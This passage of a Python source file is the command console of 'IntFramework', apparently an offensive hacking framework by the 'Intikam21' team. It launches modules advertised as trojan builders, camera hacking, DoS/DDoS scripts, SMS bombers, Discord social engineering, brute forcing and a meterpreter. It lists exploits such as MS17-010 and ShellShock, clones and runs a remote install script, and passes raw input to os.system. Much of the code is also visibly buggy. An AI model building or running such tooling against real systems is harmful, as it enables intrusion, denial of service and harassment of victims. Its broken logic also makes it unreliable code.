            ".js": "node",
            ".rb": "ruby",
            ".php": "php",
            ".pl": "perl",
            ".sh": "bash",
            ".go": "go run",
            ".sql": "sqlcmd",
            ".html": "browser",
            ".lua": "lua",
            ".ps1": "powershell"  # PowerShell desteği
        }

        # Uzantıya göre yorumlayıcı belirle
        if extension in interpreter_by_extension:
            # Eğer uzantı ".py" ise, kullanıcı Python 2 için mi yoksa Python 3 için mi çalıştıracağını seçebilir.
            if extension == ".py":
                with open(module_path, 'r', buffering=1024) as file:
                    first_line = file.readline().strip()
                    if "python2" in first_line:  # Shebang Python 2 mi işaret ediyor?
                        return "python2"
                    else:
                        return "python3"  # Varsayılan olarak Python 3
            return interpreter_by_extension[extension]

        # 3. Eğer uzantı bilinmiyorsa, shebang satırını kontrol et
        with open(module_path, 'r', buffering=1024) as file:
            first_line = file.readline().strip()
            if first_line.startswith("#!"):
                if "python2" in first_line:
                    return "python2"
                elif "python" in first_line or "python3" in first_line:
                    return "python3"
                elif "ruby" in first_line:
                    return "ruby"
                elif "php" in first_line:
                    return "php"
                elif "perl" in first_line:
                    return "perl"
                elif "node" in first_line or "javascript" in first_line:
                    return "node"
                elif "gcc" in first_line or "clang" in first_line:
                    return "gcc"
                elif "g++" in first_line or "cpp" in first_line:
                    return "g++"
                elif "bash" in first_line or "sh" in first_line:
                    return "bash"
                elif "go" in first_line:
                    return "go run"
                elif "lua" in first_line:
                    return "lua"
                elif "powershell" in first_line or "pwsh" in first_line:
                    return "powershell"
                elif "csharp" in first_line or "dotnet" in first_line:
                    return "csharp"
                elif "sql" in first_line:
                    return "sqlcmd"
                elif "html" in first_line:
                    return "browser"

        # 4. Ne uzantı ne de shebang tespit edilemiyorsa, varsayılan olarak Python 3 döndür
        print(f"{Fore.YELLOW}[+] No valid interpreter found. Defaulting to python3 for module: {Fore.CYAN}{module_path}{Style.RESET_ALL}")
        return "python3"

    except Exception as e:
        print(f"{Fore.RED}[!] Error detecting interpreter for {Fore.CYAN}{module_path}{Style.RESET_ALL}: {e}{Style.RESET_ALL}")
        return "python3"  # Hata durumunda python3 döndür

def run_module(skar3792=None, payload=None, lhost=None, lport=None):
    global modules
    int_output = False
    has_no_payload = False

    if not modules:
        print(f"{Fore.RED}[!] No module loaded. Use 'use intframework/path/to/module_name' to load one.{Style.RESET_ALL}")
        return

    try:
        # Modülü analiz et
        print(f"{Fore.YELLOW}[*] Inspecting module: {Fore.CYAN}{modules}{Style.RESET_ALL}")
        interpreter = detect_interpreter(modules)
        
        if not interpreter:
            print(f"{Fore.RED}[!] Error: Could not detect the interpreter for the module.{Style.RESET_ALL}")
            return
        
        with open(modules, 'r') as f:
            content = f.read().lower()
        
        if all(x in content for x in ["lhost", "lport", "payload"]):
            int_output = True
        elif all(x in content for x in ["lhost", "lport"]):
            has_no_payload = True

        print(f"{Fore.GREEN}[+] Module inspection complete.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error during module inspection: {e}{Style.RESET_ALL}")
        return

    try:
        # Modülü çalıştır
        print(f"{Fore.YELLOW}[*] Running module: {Fore.CYAN}{modules}{Style.RESET_ALL}")
        if int_output:
            command = f"{interpreter} {modules} {lhost} {lport} {payload}"
        elif has_no_payload:
            command = f"{interpreter} {modules} {lhost} {lport}"
        else:
            command = f"{interpreter} {modules} {skar3792}"

        print(f"{Fore.MAGENTA}[>] Command: {Fore.WHITE}{command}{Style.RESET_ALL}")
        os.system(command)
        print(f"{Fore.GREEN}[+] Module executed successfully.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error during module execution: {e}{Style.RESET_ALL}")

def monitor_process(proc):
    """Çalışan modülü izler"""
    global running_pid
    while True:
        if proc.poll() is not None:  # Process bitti mi?
            print(f"Module {modules} has stopped.")
            return
        time.sleep(1)  # Her saniye kontrol et
def get_input(modules=None, modulename=None, cdn=None):
    global prompt
    get_meterpreter()
    module = modules if modules is not None else ""
    module_name = modulename if modulename is not None else ""
    cd = cdn if cdn is not None else ""
    prompt = (f"{Fore.BLUE}int4-pro{Fore.RESET} payloads({Fore.RED}{payloads}{Fore.RESET})>{Style.RESET_ALL}" if payloads else
              f"{Fore.BLUE}int4-pro{Fore.RESET} {module_name}({Fore.RED}{module}{Fore.RESET}) >{Style.RESET_ALL}" if module and module_name else
              f"{Fore.BLUE}int4-pro{Fore.RESET} ({Fore.RED}{cd}{Fore.RESET}) >{Style.RESET_ALL}" if cd else
              f"{Fore.BLUE}{Style.BRIGHT}int4-pro{Style.RESET_ALL} >")
init(autoreset=True)
get_input()
banner()
pro_plugin()
menu_banner()
global help_input
global valid_commands
valid_commands = {
"neofetch", "com-help", "intshark", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat", "use", "exploit", "bset", "banner", "py-search", "payload-search", "exp-search", "exploit-search", "jobs", "jobs -k", "dns", "help", "use ", "intcrawler", "searchuser", "mailsearch", "phonesearch", "connectbot", "meterpreter", "shotgun", "imei", "exp-search", "py-search", "run", "show", "whoI", "intattack", "load_plugins", "list_plugins", "run_plugins", "monitor", "add_module", "intattack", "exploiter", "modular","wifi_scan", "network_scan", "wardriving", 'int', 'hydra', 'dragon', "tunnel", "portfwd", "route", #more more more.....
    }
global st
from uuid_manager import *
load_sessions()
create_session("intrpc", "root@int")
print(" ")
global running_pid
running_pid = None        
while True:
    help_input = input(prompt)
    if help_input.lower() == "help":
    	print("""
IntFramework Help Menu
==============================

General Commands  
----------------------  
Command            - Function 
=============================
help               - Show help for commands  
exit               - Exit the console  
banner             - Display or customize the banner tutorial  
clear              - Clear the console screen  
use                - Select a module to use  
show               - Display available commands, tools, or exploits  
info               - Get detailed information about the selected module  
run                - Execute the selected module  
jobs               - View and manage active jobs  
kill               - Terminate a specific job  
db_connect         - Connect to a database  
db_list            - List all available databases  
db_disconnect      - Disconnect from the current database  
db_nmap            - Perform database-integrated Nmap scanning  
route              - Add or view routing for specific IPs  
portfwd            - Set up port forwarding rules  
tunnel             - Configure and manage routing tunnels  
connect            - Connect to a specified IP address  
neofetch           - Display detailed system information  
wifi_scan          - Scan for nearby Wi-Fi networks  
network_scan       - Perform a network scan to discover devices  
wardriving         - Map and track Wi-Fi networks using GPS  
dragon             - Launch the Dragon brute-force tool  
introjan           - Build and deploy advanced Trojan Horses  
oip                - Search open ports on a target system  
intcrawler         - Crawl and gather data from websites  
usersearcher       - Search for information about specific users
mailsearcher       - Search for email addresses linked to targets
intweb             - Perform web application scanning and analysis
intninja           - Access Ninja tools for stealth operations  
intmail            - Search for email-related vulnerabilities  
intcam             - A camera hacking tool for Intikam21 users  

Module Commands  
----------------  
Command            - Function
============================
use                - Select a module to use  
show               - Display available commands, tools, or exploits  
info               - Get detailed information about the selected module  
run                - Execute the selected module  

Database Commands  
------------------  
Command            - Function  
==============================
db_connect         - Connect to a database  
db_list            - List all available databases  
db_disconnect      - Disconnect from the current database  
db_nmap            - Perform database-integrated Nmap scanning  

Networking Commands  
--------------------  
Command            - Function  
=============================
route              - Add or view routing for specific IPs  
portfwd            - Set up port forwarding rules  
tunnel             - Configure and manage routing tunnels  
connect            - Connect to a specified IP address  

Auxiliary Commands  
-------------------  
Command            - Function  
=============================
neofetch           - Display detailed system information  
wifi_scan          - Scan for nearby Wi-Fi networks  
network_scan       - Perform a network scan to discover devices  
wardriving         - Map and track Wi-Fi networks using GPS  

Attacking Commands  
-------------------  
Command            - Function  
=============================
dragon             - Launch the Dragon brute-force tool  
introjan           - Build and deploy advanced Trojan Horses  

OSINT Commands  
---------------  
Command            - Function  
============================
oip                - Search open ports on a target system  
intcrawler         - Crawl and gather data from websites  
usersearcher       - Search for information about specific users  
mailsearcher       - Search for email addresses linked to targets  

Specialized Tools  
------------------  
Command            - Function  
===========================
intweb             - Perform web application scanning and analysis  
intninja           - Access Ninja tools for stealth operations  
intmail            - Search for email-related vulnerabilities  
intcam             - A camera hacking tool for Intikam21 users  


HELLO, WE ARE THE İNTİKAM21 CYBER TEAM!  
The reason we made this tool is to educate people interested in hacking.  
Any malicious behavior or system infection caused by the user is not our responsibility.  

[intweb] Web scanner for Intikam21 users  
[intcam] Cam Hack for Intikam21 users  

We are working...
""")
    if help_input == "wifi_scan":
    	scan_wifispy()
    else:
    	print("not rooted")
    if help_input.startswith("py-search" or "payload-search") and help_input.endswith("''"):
    	    if help_input.startswith("payload-search '") and help_input.endswith("'"):
    	    	term = user_input[len("payload-search '"):-1]
    	    	result = search_payloads(term)
    	    	print_payloads(result)
    	    else:
    	    	term = user_input[len("py-search '"):-1]
    	    	result = search_payloads(term)
    	    	print_payloads(result) 
    if help_input.startswith("select"):
    	h  = help_input[7:]
    	if h.lower() == "doshack":
    		if get_input(cdn="auxiliary/dos"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""    			 
    			    cd ~
    			    cd intframework
    			    cd DoShAcK
    			    python Doshack.py
    			    """)
    			else:
    				pass
    		else:
    			print("invalid command!")    			
    	if h.lower() == "dos.py":
    		if get_input(cdn="auxiliary/dos"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""    			 
    				python3 DDOS.py
    			    """)
    			else:
    				pass
    		else:
    			print("invalid command")
    	if h.lower() == "-spc/discord":
    		if get_input(cdn="auxiliary/social-enginering"):
    			s = input("selected if you are want to run [y/n] else you are want to write a run on console* ")
    			if s.lower() == "y":
    				os.system("""
    				python3 DİSCORD.py
    			    """)
    			else: 
    				pass
    			os.system("python3 DİSCORD.py")
    		else:
    			print("İNVALİD COMMAND")
    	if h.lower() == "intformations":
    		if get_input(cdn="auxiliary/social-enginering"):
    		    try:
    			    f  = os.system("""
    			apt update -y && apt upgrade -y
    			pkg install git
    			pkg install python
    			pkg install python3
    			git clone https://github.com/Intikam21kurucu/int-formations
    			chmod +x install.sh
    			./install.sh
    			""")
    		    except:
    		    	print()
    if help_input == "show examples":
    	print("""
    	For Examples:
		use command using auxiliary:
			use auxiliary
		selecting dirs example(if use auxiliary) else (use exploits or payloads or other tools):
			select {Your selecting module)
RUN
=======
	For Example:
		run shodan
		if you are set domain or others and use shodan following commands:
			use shodan
			set API={YourApiKey}
			or set API {YourApiKey}
			set mail=yourinfo@example.com
			or
			set DOMAİN=google.com
			else
			you are must using arguments or back else set other arguments for shodan
		finally:
			run
Examples:
    others enter a documents,
    # Entering Modules:
    	usage:
    		use modules (Your Path)
    	# example:
    		set other=127.0.0.1
    		use modules /intframework/modules/intcrawler/
    		run
    	""")
    if help_input == "show exploits":
    	print("""
+------------------------------------------------------------------------+
|                           EXPLOİTS                                    |
+------------------------------------------------------------------------+
| /intframework/modules/exploits/MS17-010/      |
| /intframework/modules/exploits/CVE-2006/       |
| /intframework/modules/exploits/CVE-2018-6389/       |
| /intframework/modules/exploits/CVE-2016-3074/       |
| /intframework/modules/exploits/CamExploit2/       |
| /intframework/modules/exploits/CollectID/           |
| /intframework/modules/exploits/DiamondFox/           |
| /intframework/modules/exploits/DropleGanger/        |
| /intframework/modules/exploits/HydraPwn/           |
| /intframework/modules/exploits/IE-AURORA/           |
| /intframework/modules/exploits/MS14-068/            |
| /intframework/modules/exploits/ShellShock/        |
| /intframework/modules/exploits/TorCT-Shell/      |
| /intframework/modules/exploits/WifiToolInstaller/    |
| /intframework/modules/exploits/gwn700/              |
| /intframework/modules/exploits/se0wned/              |
| /intframework/modules/exploits/se0wned/              |
| /intframework/modules/exploits/Brainpan-Exploit.py/   |
| /intframework/modules/exploits/Httproxyscan.py/ |
| /intframework/modules/exploits/carpwned.py/    |
| /intframework/modules/exploits/php_carpwn.py/     |
| /intframework/modules/exploits/CrashCast/           |
| /intframework/modules/exploits/DropleGanger/         |
| /intframework/modules/exploits//       |
| /intframework/modules/exploits/CVE2018-10561/       |
| /intframework/modules/exploits/Fuzzering/           |
| /intframework/modules/exploits/ac68.py/             |
+------------------------------------------------------------------------+
    	""")
    if help_input.startswith("meterpreter") and help_input.endswith(""):
    			os.system("python3 intmeterpreter.py start")
    			add_job("meterpreter")
    if help_input.startswith("check"):
    	check_chef = help_input[6:]
    	check_ip(check_chef)
    if help_input.startswith("jobs"):
    	list_jobs()
    	if "-k" in help_input:
    		job_id = help_input[help_input.find("-k "):]
    		kill_job(job_id)
    if help_input == "use bots":
    	print("""
    	   BOT   NAME          Language        platform
    	----------------------------    ----------------        ------------
    	smsbomber/bot1   turkish/Türkiye termux
    	mailinputter/bot1   english/US          whattsapp
    	  genius_ip/bot1      turkish/Türkiye   telegram  
    	""")
    	setter = input(f"{Fore.RED + Style.BRIGHT} int4 (bot selecter) >")
    	if setter == "smsbomber/bot1":
    		get_input(modulename="bots", modules="smsbomber-bot")
    	if setter == "mailinputter/bot1":
    		get_input(modulename="bots", modules="mailinputter-bot")
    	if setter == "genius_ip/bot1":
    		get_input(modulename="bots", modules="genius_ip-bot")
    if help_input.startswith("dns"):
    	if "-f" in help_input:
    		format_chef = help_input[help_input.find("-f "):]
    		main_chef = help_input[help_input.find("DHOST="):]
    		port_chef = help_input[help_input.find(":" or "DPORT="):]
    		domain, port = parse_input(help_input)
    		def tryp(domain):
    		  try:
    		  	socket.inet_aton(domain)
    		  	is_ip = True
    		  except socket.error:
    		  	is_ip = False
    		tryp(domain)
    		
    		if format_chef.lower() == "reverse":
    			if is_ip:
    				reverse_dns_lookup(domain, port)
    			else:
    				print("is not ip")    			
    		if format_chef.lower() == "txt":
    			dns_lookup_txt(domain, port)
    		if format_chef.lower() == "a":
    			dns_lookup_a(domain, port)
    		if format_chef.lower() == "mx":
    			dns_lookup_mx(domain, port)
    		if format_chef.lower() == "ns":
    			dns_lookup_ns(domain, port)
    if help_input.lower().startswith("intninja"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intninja.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intvenom"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intvenom.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intweb"):
    	hel = help_input[7:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intweb "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("introjan"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 introjan.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intcam"):
    	hel = help_input[7]
    	s = os.getcwd()
    	os.system("$INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intcam.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("oip"):
    	hel = help_input[4:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 oip "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmail"):
    	hel = help_input[8:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("cd modules")
    	os.system("python3 modules/intmail.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmeterpreter"):
    	hel = help_input[15:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 modules/intmeterpreter.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("imei"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[5:]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 imei.py "+hel)
    		os.system(f"cd {s}")
    	else:
    		pass	
    if help_input.lower().startswith("mailsearcher"):
    	hel = help_input[help_input.find("mailsearcher"):]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 mailsearcher.py"+hel)
    	os.system(f"cd {s}")
    if help_input.startswith("usersearcher"):
    	hel = help_input[help_input.find("usersearcher"):]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 usersearcher.py"+hel)
    	os.system(f"cd {s}")
    if help_input.startswith("shotgun"):
    	hel = help_input[help_input.find("shotgun "):]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system(f"python3 shotgun.py {hel}" if hel else "python3 shotgun.py")
    	os.system(f"cd {s}")
    if help_input.startswith("intcrawler"):
    	hel = help_input[help_input.find("intcrawler "):]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intcrawler.py {hel}" if hel else "python3 intcrawler.py.")
    	os.system(f"cd {s}")
    	
    elif help_input.lower().startswith("back"):
    	get_input()
    elif help_input.lower().startswith("info" or "get-help"):
    	global info_get
    	if help_input.lower().startswith("info"):
    		info_get = help_input[5:]
    	if help_input.lower().startswith("get-help"):
    		info_get = help_input[9:]
    	else:
    		print("invalid argument detected")
    	if info_get.lower() == "dns":
    		print("""
            usage:
        
            Commands           Function
            ==========         ========              
            DHOST=             İP OR HOST
            -f (Format)   >>    formatting dns example modules: txt, mx, ns, a
            DPORT
        
            example:
                dns DHOST=127.0.0.1:90 -f txt
                dns DHOST=127.0.0.1 DPORT=90 -f mx
                """)
    		if info_get.lower() == "connect":
    			print("""
    			usage: connect CHOST=(HOST) CPORT=(PORT)
    			CHOST:
    				your target host or your want to connect host
    			CPORT:
    				your tadget port or your want to connect port
    			Commands       Function
    		   ==========     =========
    		   CHOST               connecting target host
    		   CPORT               connecting target port
    			""")
    		if info_get.lower() == "introjan":
    			print("""
İNTROJAN COMMANDS
=====================
    |Command|           |Function|
    ------------------            ----------------
	 -ip or -ipv4           -İp adress of the target
	 -k   					   -connect a cable
	 -r or --remote      -remote to lxde or cmd
	 -d or --dir			 -directory show on computer
	 -g   {video url}     -open video url on computer	
	 -p    				  	-port
	 -s or --send-message  -send ip or cable to computer
    			""")
    		if info_get.lower() == "oip":
    			print("""
    			
    			""")
    		if info_get.lower() == "vp":
    			print("""
    			Commands      Function
    		   ===========  =========
    		     -a --add           adding and installing vp
    		     -b --build		building vp
    		     
    		     example:
    		     	vp -a or vp --add
    		     	vp -b or vp --build    		     	
    			""")
    		if info_get.lower() == "use":
    			print("""
    			Commands    Function
    		   ==========  =========
    intframework::modules        using intmodules
    		    exploit            using exploits
    		    payloads       using payloads
    		    auxiliary        using auxiliary modules
    		    shodan          using shodan
    		    osint              using osint
    		    attack            intikam21 attack modules
    		    drones           using intdrones
    		    scanners       using scanner
    		    
    		    example:
    		    	use intframework::modules::AUTO:ctf
    		    
    		    we are developed this framework this framework uses :: not / 
    		    Please do not contact us for this. 
    		    	
    			""")
    elif help_input.startswith("connect"):
    	ip_chef = help_input[help_input.lower().find("CHOSTS=" or "CHOST= "):]
    	port_chef = help_input[help_input.lower().find("CPORT=" or "CPORTS=")]
    	if ip_chef:
    		listen(ip_chef)
    	if ip_chef and port_chef:
    		listen_p(ip_chef, port_chef)
    else:
    	try:
    		pass
    	except:
    		pass
    if help_input.startswith("searchuser"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("searchuser "):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 searchuser.py "+hel if hel else "python3 searchuser.py")
    		os.system(f"cd {s}")
    	else:
    		os.system(help_input)
    if help_input.startswith("intserver"):
    	if "--autoupdate" in help_input:
    		os.system("python3 update.py")
    	if "shot" in help_input:
    		os.system(f"python3 shotgun.py LHOSTS={LHOSTS if LHOSTS else None} LPORTS={LPORTS if LPORTS else None} bytes=200000")
    elif help_input == "banner":
    	banner()
    	menu_banner()
    elif help_input.startswith("vp"):
    	if '-' not in help_input:
    		print("please arguments")
    	if '-w' or '--start-web' in help_input:
    		os.system("python3 webstarter.py")
    	else:
    		pass
    	if '-a' or '--add' in help_input:
    		global add_add
    		add_add = "ADDED"
    	else:
    		pass
    	if '-a' or '--add' not in help_input:
    		add_add = None
    	else:
    		pass
    	if '-b' or '--build' in help_input:
    		if add_add == None:
    			print("please use vp add command first")
    			global add_slan
    			add_slan = None
    		if add_add == "ADDED":
    			import pyfiglet
    			a = pyfiglet.figlet_format("INTIKAM21 OFFİCİAL") 
    			print(a)
    			print("starting")
    			t.sleep(3)
    			os.system("sh intvirtualstarter.sh")
    			add_job("intikam21 virtual pc")
    			add_slan = "YES"
    		elif add_slan == "YES" and add_add == "ADDED":
    			print("builded you are must use -all")
    	else:
    		pass
    	if '-all' in help_input:
    		os.system("""
			python3 İNTOFİCCİAL.py
			""")
    	else:
    		pass

    if help_input == "show scanners":
    	print("""
+------------------------------------------------------------------------+
|                         SCANNERS                                   |
+====================================+
| /intframework/modules/scanners/portscan |
| /intframework/modules/scanners/bluetooth_scanners.py|
| /intframework/modules/scanners/dirscanner|
| /intframework/modules/scanners/emailscan|
| /intframework/modules/scanners/userscan |
| /intframework/modules/scanners/wlanscanner|
| /intframework/modules/scanners/adminfinder |
| /intframework/modules/scanners/service_scanner|
| /intframework/modules/scanners/vulnerability_scanner|
| /intframework/modules/scanners/dns_scanner|
| /intframework/modules/scanners/ping_scan|
| /intframework/modules/scanners/network_scan|
| /intframework/modules/scanners/Crack/wificracker|
+------------------------------------------------------------------------+    	
    	""")
    if help_input.startswith("add_module"):
    	mdd = help_input[11:]
    	try:
    		os.system(f"mv {mdd} usr/opt/intframework/modules/")
    	except:
    		try:
    			os.system(f"mv {mdd} $INTFRAMEWORK_PATH")
    		except:
    			print("please export INTFRAMEWORK_PATH.")
    
    if help_input.startswith("wardriving"):
    	setdbs = help_input[11:]
    	if setdbs == "start":
    		set_wlan = help_input[17:]
    		scan5115(set_wlan)
    	if setdbs == "end" or "exit" or "break":
    		break
    		continue
    else:
    	pass
    if help_input.startswith("db_nmap"):
        # Nmap komutunu çalıştır
        nmap_scanner = NmapScanner()
        if help_input == "db_nmap -l":
                # Veritabanındaki sonuçları listele
            print("Listing scan results:")
            nmap_scanner.db.list_scan_results()

        elif help_input == "db_nmap close":
                # Veritabanı bağlantısını kapat
            print("Closing database...")
            nmap_scanner.db.close()
            os.remove(nmap_scanner.db.db_name)  # Veritabanı dosyasını sil
            print("Database file deleted.")

        else:
        	nmap_command = help_input.replace("db_nmap", "nmap")
        	nmap_scanner.run_command(nmap_command)
    if help_input == "db_connect":
    	st = "started"
    if help_input == "db_list":
    	db_list()
    if help_input  == "db_disconnect":
    	db_disconnect()
    if help_input.startswith("load "):
    	arg = help_input[5:]
    	try:
    		pg_manager.load_plugin(arg)
    	except:
    		print("")
    		pass
    else:
    	pass
    if help_input.startswith("activate_plugins"):
    	pg_manager.load_plugins()
    if help_input.startswith("session"):
    	d = help_input[8:]
    	if d.startswith("-k"):
    		kill_id = d[3:]
    		kill_session(kill_id)
    	if d == "-l":
    		load_sessions()
    		session_listele()
    		cleanup()
    if help_input == "exploiter":
    	print("new exploiter session created")
    	os.system("python3 exploiter.py")
    if help_input == "modular":
    	os.system("python3 modular.py")
    if help_input == "list_plugins":
    	pg_manager.list_plugins()
    else:
    	pass
    if help_input == "neofetch":
    	os.system("python3 neofetch.py")
    	add_job("neofetch")
    else:
    	pass
    if help_input == "intattack":
    	os.system("python3 intattack.py")
    if help_input.startswith("network_scan"):
    	import network_scan
    	from network_scan import *
    	scan_network()
    if help_input.startswith("use intframework::"):
        use_module(help_input)
    if help_input.startswith("run") and "<" in help_input and ">" in help_input:
        start_index = help_input.find('<') + 1
        end_index = help_input.find('>')
        extracted_text = help_input[start_index:end_index]
        run_module(skar3792=extracted_text)
    if help_input == "run":
        run_module()
    if help_input == "osint":
    	print("https://osintframework.com/")
    if help_input.startswith("search"):
    	termof_search = help_input[7:]
    	if termof_search:
    		us_search(termof_search)
    	else:
    		fpth = list_all_files(dirs_int)
    		display_files(fpth)
    if help_input == "whoami":
    	username = getpass.getuser()
    	# Sistemin platform bilgisini alma
    	platform_info = platform.system()
    	print(Fore.GREEN + username)
    help = {"com-help" or "Com-help" or "Com-Help" or "com-HELP" or "COM-help" or "COM-HELP"}
    if help_input.startswith("route"):
    	routeip = help_input[6:]
    	if routeip:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/route.py {routeip}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/route.py")
    if help_input.startswith("portfwd"):
    	portforwd = help_input[8:]
    	if portforwd:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/portfwd.py {portforwd}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/portfwd.py")
    if help_input.startswith("tunnel"):
    	tunnels = help_input[8:]
    	if tunnels:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/tunnel.py {tunnels}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/tunnel.py")
    if help_input.startswith("dragon"):
    	dragonn = help_input[8:]
    	if dragonn:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/dragon {dragonn}")
    	else:
    		os.system(f"python3 $INTFRAMEWORK_PATH/modules/commands/dragon")

    if help_input in help:
    	os.system("help")
    if not any(help_input.startswith(command) for command in valid_commands):
    	t.sleep(0.75)
    	if help_input.startswith("hydra"):
    		os.system(help_input)
    		add_job("working hydra")
    		continue
    	if help_input.startswith("ls"):
    		os.system(help_input)
    		add_job(help_input)
    		continue
    	if help_input.startswith("cd"):
    		os.system(help_input)
    		add_job(help_input)
    		continue
    	if help_input.startswith("int"):
    		os.system(help_input)
    		add_job(help_input)
    		continue
    	print(f"{Fore.GREEN}[+] Running command: {help_input}")
    	os.system(help_input)
    	add_job(help_input)
    else:
    	pass
    try:
    	if st == "started":
    		db_connect()
    except:
    	pass